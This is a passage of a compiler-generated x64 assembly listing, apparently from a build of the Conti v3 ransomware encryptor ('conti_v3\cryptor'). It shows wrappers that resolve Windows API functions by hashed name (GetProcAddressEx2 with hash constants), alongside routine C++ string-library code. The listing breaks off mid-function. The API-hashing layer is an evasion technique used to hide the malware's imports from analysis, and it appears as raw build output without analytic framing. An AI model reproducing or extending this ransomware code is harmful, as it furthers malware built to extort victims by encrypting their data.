;	COMDAT ?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpSystemInfo$ = 256
?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z PROC	; pGetNativeSystemInfo, COMDAT

; 235  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 236  : 	VOID(WINAPI * pFunction)(LPSYSTEM_INFO);
; 237  : 	pFunction = (VOID(WINAPI*)(LPSYSTEM_INFO))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xde1467b1, 90);//GetProcAddress(hKernel32, OBFA("GetNativeSystemInfo"));

  0001f	41 b9 5a 00 00
	00		 mov	 r9d, 90			; 0000005aH
  00025	41 b8 b1 67 14
	de		 mov	 r8d, -569088079		; de1467b1H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 238  : 	return pFunction(lpSystemInfo);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpSystemInfo$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 239  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z ENDP	; pGetNativeSystemInfo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWaitForSingleObject@@YAKPEAXK@Z
_TEXT	SEGMENT
pFunction$ = 8
hHandle$ = 256
dwMilliseconds$ = 264
?pWaitForSingleObject@@YAKPEAXK@Z PROC			; pWaitForSingleObject, COMDAT

; 157  : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 158  : 	DWORD(WINAPI * pFunction)(HANDLE, DWORD);
; 159  : 	pFunction = (DWORD(WINAPI*)(HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe0c23134, 98);//GetProcAddress(hKernel32, OBFA("WaitForSingleObject"));

  00023	41 b9 62 00 00
	00		 mov	 r9d, 98			; 00000062H
  00029	41 b8 34 31 c2
	e0		 mov	 r8d, -524144332		; e0c23134H
  0002f	ba 0f 00 00 00	 mov	 edx, 15
  00034	33 c9		 xor	 ecx, ecx
  00036	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003b	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 160  : 	return pFunction(hHandle, dwMilliseconds);

  0003f	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwMilliseconds$[rbp]
  00045	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hHandle$[rbp]
  0004c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 161  : }

  0004f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00056	5f		 pop	 rdi
  00057	5d		 pop	 rbp
  00058	c3		 ret	 0
?pWaitForSingleObject@@YAKPEAXK@Z ENDP			; pWaitForSingleObject
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrlenW@@YAHPEB_W@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString$ = 256
?plstrlenW@@YAHPEB_W@Z PROC				; plstrlenW, COMDAT

; 58   : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 59   : 	INT(WINAPI * pFunction)(LPCWSTR);
; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  0001f	41 b9 6c 00 00
	00		 mov	 r9d, 108		; 0000006cH
  00025	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 61   : 	return pFunction(lpString);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 62   : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?plstrlenW@@YAHPEB_W@Z ENDP				; plstrlenW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1535 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1536 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1531 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1532 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4894 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4895 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4890 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4891 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
_Al$1 = 40
$T2 = 260
this$ = 320
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4864 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 4865 :         _My_data._Orphan_all();

  0002a	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  0002e	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00033	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00037	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  0003c	0f b6 c0	 movzx	 eax, al
  0003f	85 c0		 test	 eax, eax
  00041	74 34		 je	 SHORT $LN2@Tidy_deall

; 4867 :             _ASAN_STRING_REMOVE(*this);
; 4868 :             auto& _Al = _Getal();

  00043	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0004a	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0004f	48 89 45 28	 mov	 QWORD PTR _Al$1[rbp], rax

; 4869 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

  00053	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00057	4c 8b 40 18	 mov	 r8, QWORD PTR [rax+24]
  0005b	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0005f	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00062	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$1[rbp]
  00066	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4870 :             _My_data._Bx._Switch_to_buf();

  0006b	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0006f	48 8b c8	 mov	 rcx, rax
  00072	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
$LN2@Tidy_deall:

; 4871 :         }
; 4872 : 
; 4873 :         _My_data._Mysize = 0;

  00077	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0007b	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00083	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00087	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0008f	33 c0		 xor	 eax, eax
  00091	66 89 85 04 01
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00098	b8 02 00 00 00	 mov	 eax, 2
  0009d	48 6b c0 00	 imul	 rax, rax, 0
  000a1	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  000a5	48 03 c8	 add	 rcx, rax
  000a8	48 8b c1	 mov	 rax, rcx
  000ab	48 8d 95 04 01
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  000b2	48 8b c8	 mov	 rcx, rax
  000b5	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 4877 :     }

  000ba	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000c1	5f		 pop	 rdi
  000c2	5d		 pop	 rbp
  000c3	c3		 ret	 0
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 224
_Requested$ = 232
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4773 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00024	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00030	4c 8b c0	 mov	 r8, rax
  00033	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003a	48 8b 50 18	 mov	 rdx, QWORD PTR [rax+24]
  0003e	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Requested$[rbp]
  00045	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth

; 4775 :     }

  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 8
$T4 = 232
__$ArrayPad$ = 248
_Requested$ = 288
_Old$ = 296
_Max$ = 304
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 12 00 00 00	 mov	 ecx, 18
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 48
	01 00 00	 mov	 rcx, QWORD PTR [rsp+328]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 f8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00053	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Requested$[rbp]
  0005a	48 83 c8 07	 or	 rax, 7
  0005e	48 89 45 08	 mov	 QWORD PTR _Masked$[rbp], rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00062	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00069	48 39 45 08	 cmp	 QWORD PTR _Masked$[rbp], rax
  0006d	76 09		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  0006f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00076	eb 68		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00078	33 d2		 xor	 edx, edx
  0007a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  00081	b9 02 00 00 00	 mov	 ecx, 2
  00086	48 f7 f1	 div	 rcx
  00089	48 8b 8d 30 01
	00 00		 mov	 rcx, QWORD PTR _Max$[rbp]
  00090	48 2b c8	 sub	 rcx, rax
  00093	48 8b c1	 mov	 rax, rcx
  00096	48 39 85 28 01
	00 00		 cmp	 QWORD PTR _Old$[rbp], rax
  0009d	76 09		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0009f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  000a6	eb 38		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  000a8	33 d2		 xor	 edx, edx
  000aa	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  000b1	b9 02 00 00 00	 mov	 ecx, 2
  000b6	48 f7 f1	 div	 rcx
  000b9	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Old$[rbp]
  000c0	48 03 c8	 add	 rcx, rax
  000c3	48 8b c1	 mov	 rax, rcx
  000c6	48 89 85 e8 00
	00 00		 mov	 QWORD PTR $T4[rbp], rax
  000cd	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  000d4	48 8d 4d 08	 lea	 rcx, QWORD PTR _Masked$[rbp]
  000d8	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  000dd	48 8b 00	 mov	 rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4771 :     }

  000e0	48 8b f8	 mov	 rdi, rax
  000e3	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000e7	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData
  000ee	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000f3	48 8b c7	 mov	 rax, rdi
  000f6	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000fd	48 33 cd	 xor	 rcx, rbp
  00100	e8 00 00 00 00	 call	 __security_check_cookie
  00105	48 8d a5 08 01
